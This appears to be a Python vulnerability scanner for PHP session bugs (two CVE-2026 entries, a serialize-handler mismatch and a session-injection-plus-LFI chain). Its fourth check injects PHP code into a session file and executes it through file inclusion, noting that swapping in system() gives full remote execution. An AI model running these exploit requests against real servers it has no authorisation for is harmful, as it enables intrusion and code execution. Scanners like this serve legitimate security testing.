#!/usr/bin/env python3
"""
php2shell vulnerability checker
Checks for CVE-2026-109618, CVE-2026-109619 and the php2shell session chains.

Usage:
  python3 php2shellbt.py https://target.com
  python3 php2shellbt.py https://target.com --lfi "/vuln.php?page="
  python3 php2shellbt.py https://target.com --write-path /upload.php --read-path /api/data.php
  python3 php2shellbt.py https://target.com --all --lfi "/vuln.php?page=" --session-path /tmp/sessions/sess_
"""

import argparse
import random
import re
import string
import sys
import urllib.request
import urllib.parse
import ssl
import json

# ── helpers ──────────────────────────────────────────────────────────────────

RESET  = "\033[0m"
RED    = "\033[91m"
GREEN  = "\033[92m"
YELLOW = "\033[93m"
CYAN   = "\033[96m"
BOLD   = "\033[1m"

def rand_base(n=12):
    return ''.join(random.choices(string.ascii_letters + string.digits, k=n))

def color(text, c): return f"{c}{text}{RESET}"
def ok(msg):   print(color(f"[+] {msg}", GREEN))
def warn(msg): print(color(f"[!] {msg}", YELLOW))
def err(msg):  print(color(f"[-] {msg}", RED))
def info(msg): print(color(f"[*] {msg}", CYAN))

def request(url, method="GET", data=None, headers=None, timeout=10):
    ctx = ssl.create_default_context()
    ctx.check_hostname = False
    ctx.verify_mode = ssl.CERT_NONE

    req = urllib.request.Request(url, data=data, method=method)
    if headers:
        for k, v in headers.items():
            req.add_header(k, v)
    req.add_header("User-Agent", "Mozilla/5.0 php2shell-checker/1.0")

    try:
        with urllib.request.urlopen(req, timeout=timeout, context=ctx) as r:
            body = r.read().decode("utf-8", errors="replace")
            resp_headers = dict(r.headers)
            status = r.status
    except urllib.error.HTTPError as e:
        body = e.read().decode("utf-8", errors="replace")
        resp_headers = dict(e.headers)
        status = e.code
    except Exception as e:
        return None, {}, str(e)

    return status, resp_headers, body

def multipart_body(boundary, fields):
    """Build a raw multipart/form-data body."""
    lines = []
    for name, value, filename, ctype in fields:
        lines.append(f"------{boundary}".encode())
        if filename:
            lines.append(
                f'Content-Disposition: form-data; name="{name}"; filename="{filename}"'.encode()
            )
            lines.append(f"Content-Type: {ctype}".encode())
        else:
            lines.append(f'Content-Disposition: form-data; name="{name}"'.encode())
        lines.append(b"")
        lines.append(value.encode() if isinstance(value, str) else value)
    lines.append(f"------{boundary}--".encode())
    return b"\r\n".join(lines)


# ── checks ────────────────────────────────────────────────────────────────────

def check_php_fingerprint(base_url):
    """CVE-2026-109619 — version fingerprint via X-Powered-By."""
    print()
    info("CHECK 1 — CVE-2026-109619: PHP version fingerprint (UAF var_destroy)")
    status, headers, body = request(base_url)
    if status is None:
        err(f"Request failed: {body}")
        return False

    xpb = headers.get("X-Powered-By", headers.get("x-powered-by", ""))
    match = re.search(r"PHP/([0-9]+\.[0-9]+\.[0-9]+)", xpb, re.I)

    if not match:
        warn("X-Powered-By header not present or does not expose PHP version.")
        warn("Site may not be PHP or header is hidden — CVE-2026-109619 inconclusive.")
        return False

    version = match.group(1)
    parts = tuple(int(x) for x in version.split("."))
    info(f"PHP version detected: {BOLD}{version}{RESET}")

    # Fixed versions: 8.2.35 / 8.3.36 / 8.4.27 / 8.5.12
    def vuln(v):
        major, minor, patch = v
        if major == 5 and minor >= 4: return True
        if major == 8 and minor == 2 and patch <= 34: return True
        if major == 8 and minor == 3 and patch <= 35: return True
        if major == 8 and minor == 4 and patch <= 26: return True
        if major == 8 and minor == 5 and patch <= 11: return True
        return False

    if vuln(parts):
        if parts[0] == 5:
            warn(f"PHP {version} (5.x): X-Powered-By cannot distinguish Sury backported packages.")
            warn("  Sury 5.6.40-104+ ships the patches backported — verify the package version manually.")
        ok(f"VULNERABLE — PHP {version} is in the affected range for CVE-2026-109619.")
        ok("  Impact: var_destroy use-after-free reachable via unserialize() + destructor gadget.")
        return True
    else:
        info(f"PHP {version} appears to be a patched version.")
        return False


def check_session_fixation(base_url):
    """CVE-2026-109618 — session upload_progress use-after-free / OOM."""
    print()
    info("CHECK 2 — CVE-2026-109618: session.upload_progress use-after-free / OOM")

    marker   = rand_base(12)
    # Invalid SID (contains / which is illegal) — triggers the warning
    sid_bad  = f"nuclei/{rand_base(20)}"
    boundary = f"NucleiCVE{marker}"

    fields = [
        ("PHPSESSID",                   sid_bad,  None,          ""),
        ("PHP_SESSION_UPLOAD_PROGRESS", marker,   None,          ""),
        ("f",                           "Z",       f"{marker}.txt", "text/plain"),
    ]
    body_bytes = multipart_body(boundary, fields)
    hdrs = {
        "Content-Type": f"multipart/form-data; boundary=----{boundary}",
        "Content-Length": str(len(body_bytes)),
    }

    status, resp_headers, body = request(base_url, method="POST",
                                          data=body_bytes, headers=hdrs)
    if status is None:
        err(f"Request failed: {body}")
        return False

    indicator_a = "Session ID is too long or contains illegal characters" in body
    indicator_b = ("Failed to read session data" in body or
                   "PHP Request Startup" in body)

    if indicator_a and indicator_b:
        ok("VULNERABLE — PHP printed session-startup warnings, confirming upload_progress UAF/OOM path.")
        ok("  CVE-2026-109618: use-after-free / OOM triggered via upload_progress error path.")
        ok("  Chain: upload_progress injection → session file write → LFI → RCE (if cleanup=Off).")
        return True
    elif indicator_a:
        warn("Partial match — session ID warning triggered but no startup error visible.")
        warn("display_errors may be Off. Vulnerability may still exist — check manually.")
        return False
    else:
        info("No CVE-2026-109618 indicators found in response body.")
        info("(display_errors=Off can hide warnings even on vulnerable hosts.)")
        return False


def check_handler_mismatch(base_url, write_path, read_path):
    """php2shell handler mismatch — session deserializer confusion."""
    print()
    info("CHECK 3 — php2shell-handler-mismatch: session.serialize_handler confusion")
    info(f"  write_path = {write_path}  |  read_path = {read_path}")

    marker   = rand_base(10)
    sid      = f"nuclei{rand_base(24)}"

    # ── request 1: write with php_serialize endpoint ──
    boundary_w = f"NucleiWrite{marker}"
    fields_w = [
        ("PHPSESSID",                   sid,     None,                         ""),
        ("PHP_SESSION_UPLOAD_PROGRESS", marker,  None,                         ""),
        ("f",                           "Z",     f'x|O:8:"stdClass":0:{{}}',   "text/plain"),
    ]
    body_w = multipart_body(boundary_w, fields_w)
    hdrs_w = {
        "Content-Type": f"multipart/form-data; boundary=----{boundary_w}",
        "Content-Length": str(len(body_w)),
    }

    write_url = base_url.rstrip("/") + write_path
    status_w, _, body_w_resp = request(write_url, method="POST",
                                        data=body_w, headers=hdrs_w)
    if status_w is None:
        err(f"Write request failed: {body_w_resp}")
        return False

    # ── request 2: read with php endpoint (triggers deserialization) ──
    boundary_r = f"NucleiRead{marker}"
    fields_r = [
        ("PHPSESSID",                   sid,          None,          ""),
        ("PHP_SESSION_UPLOAD_PROGRESS", marker,       None,          ""),
        ("f",                           "Z",           "dummy.txt",   "text/plain"),
    ]
    body_r = multipart_body(boundary_r, fields_r)
    hdrs_r = {
        "Content-Type": f"multipart/form-data; boundary=----{boundary_r}",
        "Content-Length": str(len(body_r)),
    }

    read_url = base_url.rstrip("/") + read_path
    status_r, _, body_r_resp = request(read_url, method="POST",
                                        data=body_r, headers=hdrs_r)
    if status_r is None:
        err(f"Read request failed: {body_r_resp}")
        return False

    indicator_a = "Failed to decode session object" in body_r_resp
    indicator_b = "Session object destruction failed" in body_r_resp

    if indicator_a or indicator_b:
        ok("VULNERABLE — handler mismatch deserialization error detected!")
        ok("  Destructor fires during error path — POP gadget can yield RCE.")
        ok("  Related CVE: CVE-2026-109618 / CVE-2026-109619.")
        return True
    else:
        info("No handler-mismatch indicators found.")
        info("Requires display_errors=On and endpoints with different serialize_handler.")
        return False


def check_session_lfi(base_url, lfi_path, session_save_path):
    """php2shell session injection + LFI chain."""
    print()
    info("CHECK 4 — php2shell-session-injection-lfi: session file injection + LFI")
    info(f"  lfi_path     = {lfi_path}")
    info(f"  session_path = {session_save_path}")

    marker = f"NUCLEI{rand_base(10)}"
    sid    = f"nuclei{rand_base(24)}"

    # ── request 1: inject PHP marker into session file via filename ──
    upload_boundary = f"Nuclei{marker}"
    php_payload = f"<?php echo '{marker}'; ?>"
    fields = [
        ("PHPSESSID",                   sid,          None,           ""),
        ("PHP_SESSION_UPLOAD_PROGRESS", marker,       None,           ""),
        ("f",                           "Z",           php_payload,   "text/plain"),
    ]
    body_bytes = multipart_body(upload_boundary, fields)
    hdrs = {
        "Content-Type": f"multipart/form-data; boundary=----{upload_boundary}",
        "Content-Length": str(len(body_bytes)),
    }

    status1, _, body1 = request(base_url, method="POST", data=body_bytes, headers=hdrs)
    if status1 is None:
        err(f"Upload request failed: {body1}")
        return False

    # ── request 2: include the session file via LFI ──
    session_file = f"{session_save_path}{sid}"
    lfi_url = base_url.rstrip("/") + lfi_path + urllib.parse.quote(session_file)
    status2, _, body2 = request(lfi_url)
    if status2 is None:
        err(f"LFI request failed: {body2}")
        return False

    if marker in body2:
        ok("VULNERABLE — marker echoed back through LFI!")
        ok(f"  PHP payload in session file was executed: {php_payload}")
        ok("  Full RCE achievable by replacing echo with system()/passthru().")
        return True
    else:
        info("Marker not found in LFI response.")
        info("LFI path may be wrong, cleanup=On, or use_strict_mode=On.")
        return False


# ── summary helper ────────────────────────────────────────────────────────────

def print_banner(target):
    print(color("""
╔══════════════════════════════════════════════════════════════╗
║           php2shell vulnerability checker                    ║
║  CVE-2026-109618 · CVE-2026-109619 · handler-mismatch · LFI ║
╚══════════════════════════════════════════════════════════════╝""", CYAN))
    print(f"  Target : {BOLD}{target}{RESET}")
    print()

def print_summary(results):
    print()
    print(color("══════════════ RESULTS ══════════════", BOLD))
    labels = {
        "cve109619":     "CVE-2026-109619 (version fingerprint / UAF)",
        "cve109618":     "CVE-2026-109618 (session upload_progress UAF/OOM)",
        "handler":       "php2shell handler mismatch object injection",
        "session_lfi":   "php2shell session injection + LFI chain",
    }
    found = 0
    for key, label in labels.items():
        if key in results:
            v = results[key]
            if v is True:
                print(f"  {GREEN}VULNERABLE{RESET}  {label}")
                found += 1
            elif v is False:
                print(f"  {YELLOW}NOT FOUND {RESET}  {label}")
            else:
                print(f"  {YELLOW}SKIPPED   {RESET}  {label}")
    print()
    if found:
        print(color(f"  ⚠  {found} vulnerability/ies confirmed — remediate immediately.", RED + BOLD))
    else:
        print(color("  ✓  No php2shell vulnerabilities confirmed.", GREEN))
    print()


# ── main ──────────────────────────────────────────────────────────────────────

def main():
    parser = argparse.ArgumentParser(
        description="php2shell checker — CVE-2026-109618/109619 and session chains",
        formatter_class=argparse.RawDescriptionHelpFormatter,
        epilog="""
examples:
  Basic scan (checks 1 + 2):
    python3 php2shellbt.py https://target.com

  With LFI (adds check 4):
    python3 php2shellbt.py https://target.com --lfi "/vuln.php?page=" --session-path /tmp/sessions/sess_

  With handler-mismatch paths (adds check 3):
    python3 php2shellbt.py https://target.com --write-path /upload.php --read-path /api/data.php

  Full suite:
    python3 php2shellbt.py https://target.com --all \\
      --lfi "/vuln.php?page=" --session-path /tmp/sessions/sess_ \\
      --write-path /upload.php --read-path /api/data.php
""")
    parser.add_argument("target", help="Base URL of the target (e.g. https://example.com)")
    parser.add_argument("--all", action="store_true",
                        help="Run all checks (requires --lfi + --write-path + --read-path)")
    parser.add_argument("--lfi", metavar="PATH",
                        help='LFI parameter path, e.g. "/vuln.php?page="')
    parser.add_argument("--session-path", metavar="PATH", default="/tmp/sessions/sess_",
                        help='PHP session save path prefix (default: /tmp/sessions/sess_)')
    parser.add_argument("--write-path", metavar="PATH", default="/app/upload.php",
                        help='Endpoint with session.serialize_handler=php_serialize')
    parser.add_argument("--read-path", metavar="PATH", default="/api/endpoint.php",
                        help='Endpoint with session.serialize_handler=php')
    parser.add_argument("--timeout", type=int, default=10,
                        help="Request timeout in seconds (default: 10)")
    parser.add_argument("--json", action="store_true",
                        help="Output results as JSON")
    args = parser.parse_args()

    target = args.target.rstrip("/")
    print_banner(target)

    results = {}

    # Check 1 — CVE-2026-109619: version fingerprint
    results["cve109619"] = check_php_fingerprint(target)

    # Check 2 — CVE-2026-109618: session fixation
    results["cve109618"] = check_session_fixation(target)

    # Check 3 — handler mismatch (only if --all or both paths explicitly given)
    if args.all or (args.write_path != "/app/upload.php" and args.read_path != "/api/endpoint.php"):
        results["handler"] = check_handler_mismatch(target, args.write_path, args.read_path)
    else:
        print()
        info("CHECK 3 — handler mismatch: SKIPPED (use --write-path + --read-path to enable)")
        results["handler"] = None

    # Check 4 — session injection + LFI (only if --lfi given)
    if args.lfi:
        results["session_lfi"] = check_session_lfi(target, args.lfi, args.session_path)
    else:
        print()
        info("CHECK 4 — session injection LFI: SKIPPED (use --lfi to enable)")
        results["session_lfi"] = None

    if args.json:
        out = {k: ("VULNERABLE" if v is True else "NOT_FOUND" if v is False else "SKIPPED")
               for k, v in results.items()}
        print(json.dumps({"target": target, "results": out}, indent=2))
    else:
        print_summary(results)

    # Exit code: 1 if any vulnerability confirmed
    sys.exit(1 if any(v is True for v in results.values()) else 0)


if __name__ == "__main__":
    main()
